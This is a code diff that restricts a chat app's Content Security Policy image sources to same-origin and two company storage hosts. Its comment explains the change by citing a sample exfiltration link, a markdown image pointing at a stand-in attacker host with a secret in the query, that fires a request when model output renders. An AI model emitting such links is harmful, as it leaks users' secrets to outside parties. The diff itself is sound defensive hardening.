@@ -28,7 +28,15 @@ const contentSecurityPolicy = [
   // Telemetry is the @hanzo/event client, which only ever POSTs (connect-src).
   "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://hanzo.app https://static.cloudflareinsights.com",
   "style-src 'self' 'unsafe-inline'",
-  "img-src 'self' data: blob: https:",
+  // NOT `https:`. A bare-scheme image source is the classic LLM exfiltration
+  // channel: model output `![](https://attacker/p?d=<secret>)` auto-fires a
+  // GET the instant it renders. The app's own images are same-origin (served
+  // from /v1/chat/images) or come from our file store; nothing legitimate
+  // needs an arbitrary host. The markdown image RENDERER also refuses to
+  // auto-load a third-party src (MarkdownComponents.tsx `autoLoadable`) — this
+  // is the backstop under it, so a future renderer that forgets still cannot
+  // beacon.
+  "img-src 'self' data: blob: https://s3.hanzo.ai https://s3-api.hanzo.ai",
   "font-src 'self' data:",
   "media-src 'self' data: blob:",
   "connect-src 'self' https://hanzo.id https://hanzo.app https://*.hanzo.ai https://*.hanzo.chat wss://*.hanzo.chat https://static.cloudflareinsights.com https://cloudflareinsights.com",
